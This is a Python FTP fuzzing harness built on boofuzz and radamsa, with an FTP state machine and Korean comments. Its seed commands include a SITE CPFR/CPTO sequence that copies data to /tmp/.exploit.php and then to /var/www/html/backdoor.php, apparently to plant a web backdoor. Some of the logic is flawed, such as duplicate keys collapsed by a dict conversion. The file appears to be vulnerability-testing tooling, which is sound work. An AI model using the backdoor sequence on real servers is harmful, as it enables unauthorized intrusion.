from __future__ import annotations

import os
import random
from typing import Optional

from boofuzz import Block, Delim, Request, Session, Static, String
from pyradamsa import Radamsa

from netfuzz.core.base import Base


class State:
	def __init__(self) -> None:
		self.state = "INITIAL"
		self.rules = {
			"INITIAL": {"USER": "WAIT_PASS"},
			"WAIT_PASS": {"PASS": "AUTHENTICATED"},
			"AUTHENTICATED": {
				"CWD": "AUTHENTICATED",
				"MKD": "AUTHENTICATED",
				"RMD": "AUTHENTICATED",
				"DELE": "AUTHENTICATED",
				"RETR": "DATA_TRANSFER",
				"STOR": "DATA_TRANSFER",
				"RNFR": "WAIT_RNTO",
				"QUIT": "INITIAL",
				"SITE": "AUTHENTICATED",
				"STAT": "AUTHENTICATED",
				"HELP": "AUTHENTICATED",
			},
			"WAIT_RNTO": {"RNTO": "AUTHENTICATED"},
			"DATA_TRANSFER": {"ABOR": "AUTHENTICATED"},
		}

	def get_next_state(self, command: str) -> str:
		return self.rules.get(self.state, {}).get(command, "INVALID")

	def update_state(self, command: str) -> None:
		next_state = self.get_next_state(command)
		if next_state != "INVALID":
			print(f"State changed: {self.state} -> {next_state}")
			self.state = next_state
		else:
			print(f"Invalid state transition: {self.state} with command {command}")


class FTP(Base):
	def __init__(self) -> None:
		super().__init__("FTP")
		self.path = "/home/phantom"
		self.command = [
			("USER", "ftp"),
			("PASS", "ftp"),
			("SITE CPFR", "/proc/self/cmdline"),
			("SITE CPTO", "/tmp/.exploit.php"),
			("SITE CPFR", "/tmp/.exploit.php"),
			("SITE CPTO", "/var/www/html/backdoor.php"),
			("QUIT", None),
		]
		self.state = State()
		self.radamsa = Radamsa()
		self.update_commands_with_files()

	def initialize(self, session: Session) -> None:
		previous_request = None
		# 로그인 단계
		for cmd, arg in [("USER", "ftp"), ("PASS", "ftp")]:
			req = self.generate_packet(cmd, arg)
			session.connect(session.root, req)
			previous_request = req
			self.state.update_state(cmd)

		# 취약점 테스트 단계
		for cmd, arg in self.command:
			if self.state.get_next_state(cmd) != "INVALID":
				dynamic_arg = self.generate_radamsa_argument(cmd, arg, seed=random.randint(0, 1000))
				req = self.generate_packet(cmd, dynamic_arg)
				session.connect(previous_request, req)
				self.state.update_state(cmd)
				previous_request = req

	def generate_radamsa_argument(
		self,
		cmd: str,
		base_value: Optional[str],
		seed: Optional[int],
		mutations: str = "",
		patterns: str = "",
		generators: str = "",
	) -> str:
		if base_value is None:
			base_value = "default"

		radamsa_options = {
			"seed": seed,
			"mutations": mutations,
			"patterns": patterns,
			"generators": generators,
		}
		mutated_value = self.radamsa.fuzz(base_value.encode(), **radamsa_options)

		return mutated_value.decode("utf-8")

	def generate_packet(self, cmd: str, arg: Optional[str] = None) -> Request:
		if arg is None:
			block = Block(name="Command", children=[String(name="command", default_value=cmd)])
		else:
			block = Block(
				name="Command",
				children=(
					String(name="command", default_value=cmd),
					Delim(name="space", default_value=" ") if arg else None,
					String(name="argument", default_value=arg) if arg else None,
				),
			)
		return Request(name=cmd.lower(), children=(block, Static(name="end", default_value="\r\n")))

	def scan_directory_files(self) -> list[str]:
		if not os.path.isdir(self.path):
			raise ValueError(f"유효하지 않은 디렉토리 경로: {self.path}")
		return [f for f in os.listdir(self.path) if os.path.isfile(os.path.join(self.path, f))]

	def update_commands_with_files(self) -> None:
		files = self.scan_directory_files()
		command_dict = dict(self.command)

		command_dict.update(
			{
				"RETR": files[0] if files else "default.txt",
				"STOR": "upload_file.txt",
				"RNFR": files[0] if files else "default.txt",
				"RNTO": "renamed_file.txt",
			}
		)
		self.command = list(command_dict.items())
